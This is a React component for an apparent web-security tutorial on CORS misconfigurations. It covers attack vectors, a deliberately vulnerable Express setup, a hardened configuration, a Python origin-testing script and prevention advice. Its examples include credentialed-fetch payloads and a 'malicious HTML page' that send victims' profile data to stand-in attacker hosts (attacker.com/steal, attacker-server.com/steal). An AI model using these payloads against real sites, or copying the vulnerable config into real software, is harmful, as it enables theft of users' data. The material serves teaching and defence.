
import React from 'react';
import { ShieldX } from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const CORSMisconfigurations: React.FC = () => {
  return (
    <section id="cors" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">CORS Misconfigurations</h3>
      
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">What Attackers Try to Achieve</h4>
        <p className="mb-4">
          Cross-Origin Resource Sharing (CORS) misconfigurations allow attackers to bypass the same-origin policy. Attackers targeting CORS vulnerabilities aim to:
        </p>
        <ul className="list-disc pl-6 space-y-2 mb-6">
          <li><strong>Data Exfiltration</strong>: Steal sensitive user data from victim's authenticated sessions</li>
          <li><strong>Session Hijacking</strong>: Access authentication tokens, cookies, and session data</li>
          <li><strong>Privilege Escalation</strong>: Perform actions on behalf of authenticated users</li>
          <li><strong>Cross-Site Scripting Enhancement</strong>: Bypass CSP and other security controls</li>
          <li><strong>API Abuse</strong>: Access internal APIs not intended for cross-origin use</li>
          <li><strong>Information Disclosure</strong>: Read sensitive application responses and internal data</li>
        </ul>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Vulnerable Components</h4>
        <ul className="list-disc pl-6 space-y-2 mb-6">
          <li><strong>Web Application APIs</strong>: RESTful APIs with overly permissive CORS policies</li>
          <li><strong>Authentication Endpoints</strong>: Login systems that reflect Origin headers</li>
          <li><strong>File Upload Services</strong>: Services that allow cross-origin file operations</li>
          <li><strong>Microservice Gateways</strong>: API gateways with wildcard CORS configurations</li>
          <li><strong>Development Servers</strong>: Development environments with debug CORS settings</li>
          <li><strong>Third-Party Integrations</strong>: Services that trust arbitrary external domains</li>
          <li><strong>WebSocket Endpoints</strong>: Real-time communication services with weak origin validation</li>
        </ul>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Why CORS Attacks Work</h4>
        <ul className="list-disc pl-6 space-y-2 mb-6">
          <li><strong>Wildcard Origins</strong>: Using * with credentials allows any domain to make requests</li>
          <li><strong>Reflected Origins</strong>: Blindly reflecting client-provided Origin header</li>
          <li><strong>Subdomain Wildcards</strong>: Trusting all subdomains without proper validation</li>
          <li><strong>Null Origin Acceptance</strong>: Allowing null origins from sandboxed contexts</li>
          <li><strong>Inconsistent Validation</strong>: Different validation logic across endpoints</li>
          <li><strong>Development Settings in Production</strong>: Debug configurations left in production</li>
        </ul>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Common CORS Attack Vectors</h4>
        
        <h5 className="text-lg font-medium mb-3">1. Reflected Origin Attack</h5>
        <p className="mb-4">
          Server reflects any Origin header sent by the client, allowing arbitrary cross-origin requests.
        </p>
        <div className="bg-cybr-muted/30 p-4 rounded-lg mb-4">
          <p className="font-semibold mb-2">Attack Request:</p>
          <pre className="text-sm bg-cybr-muted p-2 rounded">
{`GET /api/sensitive-data HTTP/1.1
Host: vulnerable-api.com
Origin: https://attacker-site.com
Cookie: session=valid_session_token

# Server Response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker-site.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

{"sensitive": "user data", "credit_card": "1234-5678-9012-3456"}`}
          </pre>
        </div>

        <h5 className="text-lg font-medium mb-3">2. Null Origin Exploitation</h5>
        <p className="mb-4">
          Exploiting servers that trust "null" origins from sandboxed iframes or data URLs.
        </p>
        <div className="bg-cybr-muted/30 p-4 rounded-lg mb-4">
          <p className="font-semibold mb-2">Attack Vector:</p>
          <pre className="text-sm bg-cybr-muted p-2 rounded">
{`<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
        src="data:text/html,
        <script>
        fetch('https://vulnerable-api.com/api/user-data', {
          method: 'GET',
          credentials: 'include'
        }).then(r => r.text()).then(data => {
          // Exfiltrate data to attacker server
          fetch('https://attacker.com/steal', {
            method: 'POST',
            body: data
          });
        });
        </script>">
</iframe>`}
          </pre>
        </div>

        <h5 className="text-lg font-medium mb-3">3. Subdomain Takeover CORS Bypass</h5>
        <p className="mb-4">
          Combining subdomain takeover with wildcard CORS policies to bypass origin restrictions.
        </p>
        <div className="bg-cybr-muted/30 p-4 rounded-lg mb-4">
          <p className="font-semibold mb-2">Attack Chain:</p>
          <pre className="text-sm bg-cybr-muted p-2 rounded">
{`1. Find abandoned subdomain (e.g., old-service.example.com)
2. Take control via DNS or service misconfiguration
3. Host malicious script on controlled subdomain
4. Exploit wildcard CORS policy: *.example.com
5. Access main domain APIs with victim's credentials`}
          </pre>
        </div>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Step-by-Step Exploitation Process</h4>
        
        <h5 className="text-lg font-medium mb-3">Phase 1: Discovery and Reconnaissance</h5>
        <ol className="list-decimal pl-6 space-y-2 mb-4">
          <li>Identify API endpoints and their CORS configurations</li>
          <li>Test various Origin headers to understand validation logic</li>
          <li>Check for endpoints that return sensitive data</li>
          <li>Map out authentication and session management mechanisms</li>
          <li>Identify pre-flight request handling behavior</li>
        </ol>

        <h5 className="text-lg font-medium mb-3">Phase 2: CORS Policy Testing</h5>
        <ol className="list-decimal pl-6 space-y-2 mb-4">
          <li>Test with wildcard origins and credential inclusion</li>
          <li>Try reflected origin attacks with various domains</li>
          <li>Test null origin acceptance in different contexts</li>
          <li>Check subdomain wildcard validation logic</li>
          <li>Verify pre-flight vs. simple request handling differences</li>
        </ol>

        <h5 className="text-lg font-medium mb-3">Phase 3: Exploitation Development</h5>
        <ol className="list-decimal pl-6 space-y-2 mb-4">
          <li>Create malicious webpage to host the attack</li>
          <li>Develop JavaScript payload to exfiltrate data</li>
          <li>Test attack against authenticated victim sessions</li>
          <li>Optimize payload for stealth and effectiveness</li>
          <li>Set up data collection infrastructure on attacker domain</li>
        </ol>
      </div>

      <CodeExample 
        language="javascript" 
        isVulnerable={true}
        title="Vulnerable Node.js/Express CORS Configuration" 
        code={`const express = require('express');
const cors = require('cors');
const app = express();

// VULNERABILITY 1: Reflecting any origin with credentials
app.use((req, res, next) => {
  // Dangerous: Reflects any origin header sent by the client
  const origin = req.headers.origin;
  res.header('Access-Control-Allow-Origin', origin);
  
  // VULNERABILITY 2: Allowing credentials with reflected origin
  res.header('Access-Control-Allow-Credentials', 'true');
  
  // VULNERABILITY 3: Overly permissive headers
  res.header('Access-Control-Allow-Headers', '*');
  res.header('Access-Control-Allow-Methods', '*');
  
  next();
});

// Alternative vulnerable configuration using cors middleware
const corsOptions = {
  origin: function (origin, callback) {
    // VULNERABILITY 4: Accepting any origin including null
    if (!origin || origin === 'null') {
      return callback(null, true);
    }
    // VULNERABILITY 5: Weak subdomain validation
    if (origin.endsWith('.example.com')) {
      return callback(null, true);
    }
    callback(null, true); // Accept everything
  },
  credentials: true,
  optionsSuccessStatus: 200
};

app.use(cors(corsOptions));

// Sensitive API endpoint that returns user data
app.get('/api/user/profile', authenticateUser, (req, res) => {
  // Returns sensitive data that could be stolen
  res.json({
    id: req.user.id,
    name: req.user.name,
    email: req.user.email,
    ssn: req.user.ssn,
    creditCards: req.user.creditCards,
    bankAccounts: req.user.bankAccounts,
    personalDetails: req.user.personalDetails
  });
});

// Another vulnerable endpoint - admin functionality
app.post('/api/admin/users', authenticateUser, requireAdmin, (req, res) => {
  // Admin endpoint accessible via CORS
  const userData = req.body;
  // Process admin user creation
  res.json({ success: true, userId: newUserId });
});

// File upload endpoint with CORS vulnerability
app.post('/api/upload', authenticateUser, upload.single('file'), (req, res) => {
  // File upload accessible cross-origin
  res.json({ 
    success: true, 
    filename: req.file.filename,
    url: \`/uploads/\${req.file.filename}\`
  });
});

function authenticateUser(req, res, next) {
  // Simple authentication check
  const token = req.cookies.authToken;
  if (!token) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  
  // Verify token and set user
  req.user = verifyToken(token);
  next();
}`} 
      />

      <div className="mb-6">
        <p className="font-semibold mb-2">Malicious HTML Page to Exploit CORS Vulnerability:</p>
        <div className="bg-red-900/20 p-4 rounded-lg">
          <pre className="text-sm">
{`<!DOCTYPE html>
<html>
<head>
    <title>CORS Attack</title>
</head>
<body>
    <h1>Innocent Looking Page</h1>
    <p>This page steals your data when you visit it while logged into vulnerable-api.com</p>
    
    <script>
    // CORS attack to steal user data
    function stealUserData() {
        fetch('https://vulnerable-api.com/api/user/profile', {
            method: 'GET',
            credentials: 'include', // Include cookies
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(response => response.json())
        .then(userData => {
            // Exfiltrate stolen data
            fetch('https://attacker-server.com/steal', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    victim_data: userData,
                    timestamp: new Date().toISOString(),
                    user_agent: navigator.userAgent
                })
            });
            
            console.log('Data stolen:', userData);
        })
        .catch(error => {
            console.error('Attack failed:', error);
        });
    }
    
    // Execute attack when page loads
    stealUserData();
    
    // Alternative attack using null origin from iframe
    function nullOriginAttack() {
        const iframe = document.createElement('iframe');
        iframe.sandbox = 'allow-scripts allow-same-origin';
        iframe.src = 'data:text/html,<script>fetch("https://vulnerable-api.com/api/user/profile",{credentials:"include"}).then(r=>r.json()).then(d=>parent.postMessage(d,"*"))</script>';
        document.body.appendChild(iframe);
        
        window.addEventListener('message', function(event) {
            // Receive stolen data from iframe
            fetch('https://attacker-server.com/steal', {
                method: 'POST',
                body: JSON.stringify(event.data)
            });
        });
    }
    </script>
</body>
</html>`}
          </pre>
        </div>
      </div>
      
      <CodeExample 
        language="javascript" 
        isVulnerable={false}
        title="Secure CORS Implementation" 
        code={`const express = require('express');
const cors = require('cors');
const app = express();

// Define trusted origins explicitly
const TRUSTED_ORIGINS = [
  'https://app.example.com',
  'https://admin.example.com',
  'https://mobile.example.com'
];

// Environment-specific origin lists
const DEVELOPMENT_ORIGINS = [
  'http://localhost:3000',
  'http://localhost:3001',
  'http://127.0.0.1:3000'
];

// Get allowed origins based on environment
function getAllowedOrigins() {
  if (process.env.NODE_ENV === 'development') {
    return [...TRUSTED_ORIGINS, ...DEVELOPMENT_ORIGINS];
  }
  return TRUSTED_ORIGINS;
}

// Secure CORS configuration
const corsOptions = {
  origin: function (origin, callback) {
    const allowedOrigins = getAllowedOrigins();
    
    // Allow requests with no origin (mobile apps, Postman, etc.)
    if (!origin) {
      return callback(null, true);
    }
    
    // Reject null origins explicitly
    if (origin === 'null') {
      return callback(new Error('Null origin not allowed'), false);
    }
    
    // Strict origin validation
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS policy'), false);
    }
  },
  
  // Only allow credentials for trusted origins
  credentials: true,
  
  // Specify allowed methods explicitly
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  
  // Specify allowed headers explicitly
  allowedHeaders: [
    'Content-Type',
    'Authorization',
    'X-Requested-With',
    'X-CSRF-Token'
  ],
  
  // Specify which headers can be exposed to the client
  exposedHeaders: ['X-Total-Count', 'X-Page-Count'],
  
  // Set preflight cache time (in seconds)
  maxAge: 600, // 10 minutes
  
  // Include successful status for legacy browsers
  optionsSuccessStatus: 204
};

// Apply CORS configuration
app.use(cors(corsOptions));

// Additional security middleware
app.use((req, res, next) => {
  // Security headers
  res.header('X-Content-Type-Options', 'nosniff');
  res.header('X-Frame-Options', 'DENY');
  res.header('X-XSS-Protection', '1; mode=block');
  
  // Custom security headers
  res.header('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  
  next();
});

// Endpoint-specific CORS for sensitive operations
const restrictiveCorsOptions = {
  origin: function (origin, callback) {
    // Only allow specific admin origins for admin endpoints
    const adminOrigins = ['https://admin.example.com'];
    
    if (!origin || !adminOrigins.includes(origin)) {
      return callback(new Error('Admin access required'), false);
    }
    
    callback(null, true);
  },
  credentials: true,
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token']
};

// Apply restrictive CORS to admin routes
app.use('/api/admin', cors(restrictiveCorsOptions));

// Secure sensitive endpoint with additional validation
app.get('/api/user/profile', authenticateUser, validateOrigin, (req, res) => {
  // Return only necessary user data
  res.json({
    id: req.user.id,
    name: req.user.name,
    email: req.user.email,
    // Exclude sensitive fields like SSN, credit cards
    preferences: req.user.preferences
  });
});

// Enhanced authentication middleware
function authenticateUser(req, res, next) {
  const token = req.headers.authorization?.replace('Bearer ', '') || 
                req.cookies.authToken;
  
  if (!token) {
    return res.status(401).json({ error: 'Authentication required' });
  }
  
  try {
    const user = verifyToken(token);
    
    // Additional security checks
    if (!user.active || user.suspended) {
      return res.status(403).json({ error: 'Account suspended' });
    }
    
    req.user = user;
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Invalid token' });
  }
}

// Additional origin validation middleware for sensitive endpoints
function validateOrigin(req, res, next) {
  const origin = req.headers.origin;
  const referer = req.headers.referer;
  
  // Additional origin validation for sensitive operations
  if (origin && !getAllowedOrigins().includes(origin)) {
    return res.status(403).json({ error: 'Origin not allowed' });
  }
  
  // Validate referer as additional check
  if (referer) {
    const refererOrigin = new URL(referer).origin;
    if (!getAllowedOrigins().includes(refererOrigin)) {
      return res.status(403).json({ error: 'Invalid referer' });
    }
  }
  
  next();
}

// CSRF protection for state-changing operations
const csrf = require('csurf');
const csrfProtection = csrf({
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict'
  }
});

// Apply CSRF protection to state-changing endpoints
app.use('/api/user', csrfProtection);
app.use('/api/admin', csrfProtection);

// Error handling for CORS violations
app.use((error, req, res, next) => {
  if (error.message.includes('CORS') || error.message.includes('origin')) {
    // Log security violation
    console.error('CORS violation attempted:', {
      origin: req.headers.origin,
      referer: req.headers.referer,
      userAgent: req.headers['user-agent'],
      ip: req.ip,
      timestamp: new Date().toISOString()
    });
    
    return res.status(403).json({ 
      error: 'Access denied',
      code: 'CORS_VIOLATION'
    });
  }
  
  next(error);
});

// Health check endpoint without CORS restrictions
app.get('/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});`} 
      />

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Testing for CORS Vulnerabilities</h4>
        
        <h5 className="text-lg font-medium mb-3">Manual Testing Steps</h5>
        <ol className="list-decimal pl-6 space-y-2 mb-4">
          <li><strong>Origin Header Testing</strong>
            <ul className="list-disc pl-6 mt-2 space-y-1">
              <li>Test with various malicious origins (attacker.com, evil.com)</li>
              <li>Try reflected origin attacks by setting Origin to target domain</li>
              <li>Test with null origin and data: URLs</li>
              <li>Check subdomain wildcard acceptance (sub.target.com)</li>
            </ul>
          </li>
          <li><strong>Credential Inclusion Testing</strong>
            <ul className="list-disc pl-6 mt-2 space-y-1">
              <li>Test if credentials are included in cross-origin requests</li>
              <li>Verify Access-Control-Allow-Credentials header behavior</li>
              <li>Check cookie transmission in CORS requests</li>
              <li>Test authentication token handling</li>
            </ul>
          </li>
          <li><strong>Pre-flight Request Analysis</strong>
            <ul className="list-disc pl-6 mt-2 space-y-1">
              <li>Test OPTIONS request handling for complex requests</li>
              <li>Verify allowed methods and headers in pre-flight responses</li>
              <li>Check if pre-flight bypasses exist for simple requests</li>
              <li>Test pre-flight caching behavior</li>
            </ul>
          </li>
        </ol>

        <h5 className="text-lg font-medium mb-3">Automated Testing Tools</h5>
        <ul className="list-disc pl-6 space-y-2 mb-4">
          <li><strong>Burp Suite</strong>: CORS scanner extension and manual testing</li>
          <li><strong>OWASP ZAP</strong>: CORS misconfiguration detection rules</li>
          <li><strong>CORScanner</strong>: Specialized CORS vulnerability scanner</li>
          <li><strong>Postman</strong>: Manual CORS request testing</li>
          <li><strong>Custom Scripts</strong>: Automated origin fuzzing and testing</li>
          <li><strong>Browser Developer Tools</strong>: Network tab for CORS header analysis</li>
        </ul>

        <h5 className="text-lg font-medium mb-3">Testing Script Example</h5>
        <div className="bg-cybr-muted/30 p-4 rounded-lg mb-4">
          <pre className="text-sm">
{`import requests

def test_cors_misconfiguration(target_url, test_origins):
    """Test for CORS misconfigurations"""
    
    vulnerable_endpoints = []
    
    for origin in test_origins:
        headers = {
            'Origin': origin,
            'Access-Control-Request-Method': 'GET',
            'Access-Control-Request-Headers': 'authorization'
        }
        
        # Test pre-flight request
        response = requests.options(target_url, headers=headers)
        
        # Check response headers
        allow_origin = response.headers.get('Access-Control-Allow-Origin')
        allow_credentials = response.headers.get('Access-Control-Allow-Credentials')
        
        if allow_origin and allow_credentials:
            if allow_origin == origin or allow_origin == '*':
                vulnerable_endpoints.append({
                    'url': target_url,
                    'origin': origin,
                    'allow_origin': allow_origin,
                    'allow_credentials': allow_credentials,
                    'vulnerable': True
                })
        
        # Test actual request
        actual_response = requests.get(target_url, headers={'Origin': origin})
        actual_allow_origin = actual_response.headers.get('Access-Control-Allow-Origin')
        
        if actual_allow_origin == origin:
            print(f"[VULNERABLE] {target_url} reflects origin: {origin}")
    
    return vulnerable_endpoints

# Test origins
test_origins = [
    'https://attacker.com',
    'https://evil.com',
    'null',
    'https://sub.target.com',
    'http://localhost:3000'
]

# Run test
results = test_cors_misconfiguration('https://api.example.com/user/data', test_origins)`}
          </pre>
        </div>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Prevention and Secure Implementation</h4>
        
        <h5 className="text-lg font-medium mb-3">Core Security Principles</h5>
        <ul className="list-disc pl-6 space-y-2 mb-4">
          <li><strong>Explicit Origin Whitelisting</strong>: Define exact allowed origins, avoid wildcards</li>
          <li><strong>Credential Restriction</strong>: Only allow credentials for trusted, specific origins</li>
          <li><strong>Least Privilege</strong>: Grant minimum necessary CORS permissions</li>
          <li><strong>Environment Separation</strong>: Different CORS policies for development vs production</li>
          <li><strong>Regular Auditing</strong>: Periodic review of CORS configurations</li>
        </ul>

        <h5 className="text-lg font-medium mb-3">Implementation Best Practices</h5>
        <ul className="list-disc pl-6 space-y-2 mb-4">
          <li><strong>Never Use Wildcard with Credentials</strong>: Avoid `Access-Control-Allow-Origin: *` with credentials</li>
          <li><strong>Validate Origins Strictly</strong>: Use exact string matching, not pattern matching</li>
          <li><strong>Implement Origin Validation Logic</strong>: Don't blindly reflect Origin headers</li>
          <li><strong>Use HTTPS Only</strong>: Ensure all allowed origins use HTTPS in production</li>
          <li><strong>Implement CSRF Protection</strong>: Additional protection beyond CORS</li>
        </ul>

        <h5 className="text-lg font-medium mb-3">Advanced Security Measures</h5>
        <ul className="list-disc pl-6 space-y-2 mb-4">
          <li><strong>Content Security Policy</strong>: Additional layer of origin-based protection</li>
          <li><strong>SameSite Cookies</strong>: Prevent cookie transmission in cross-site requests</li>
          <li><strong>Token-Based Authentication</strong>: Avoid relying on cookies for API authentication</li>
          <li><strong>Request Signing</strong>: Cryptographically sign requests for high-security APIs</li>
        </ul>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Environment-Specific Considerations</h4>
        
        <div className="mb-4">
          <h6 className="font-medium mb-2">Development Environment</h6>
          <ul className="list-disc pl-6 space-y-1">
            <li>Allow localhost origins for development but remove in production</li>
            <li>Use environment variables for origin configuration</li>
            <li>Implement CORS testing in CI/CD pipelines</li>
            <li>Document allowed origins and their purposes</li>
          </ul>
        </div>

        <div className="mb-4">
          <h6 className="font-medium mb-2">Production Environment</h6>
          <ul className="list-disc pl-6 space-y-1">
            <li>Strictly validate all origins against whitelist</li>
            <li>Monitor CORS violations and failed requests</li>
            <li>Implement rate limiting for cross-origin requests</li>
            <li>Regular security audits of CORS configurations</li>
          </ul>
        </div>

        <div className="mb-4">
          <h6 className="font-medium mb-2">Microservices Architecture</h6>
          <ul className="list-disc pl-6 space-y-1">
            <li>Centralize CORS configuration in API gateways</li>
            <li>Use service mesh for internal service communication</li>
            <li>Implement different CORS policies for public vs internal APIs</li>
            <li>Consider using API keys instead of CORS for service-to-service communication</li>
          </ul>
        </div>
      </div>

      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Special Cases and Advanced Scenarios</h4>
        
        <h5 className="text-lg font-medium mb-3">WebSocket CORS Issues</h5>
        <p className="mb-4">
          WebSocket connections don't follow standard CORS but have origin validation requirements.
        </p>
        
        <h5 className="text-lg font-medium mb-3">PostMessage API Exploitation</h5>
        <p className="mb-4">
          Combining CORS with postMessage vulnerabilities for enhanced cross-origin attacks.
        </p>
        
        <h5 className="text-lg font-medium mb-3">Service Worker CORS Bypass</h5>
        <p className="mb-4">
          Using service workers to potentially bypass some CORS restrictions.
        </p>

        <h5 className="text-lg font-medium mb-3">Browser-Specific CORS Behavior</h5>
        <p className="mb-4">
          Different browsers may handle CORS edge cases differently, creating attack opportunities.
        </p>
      </div>
    </section>
  );
};

export default CORSMisconfigurations;
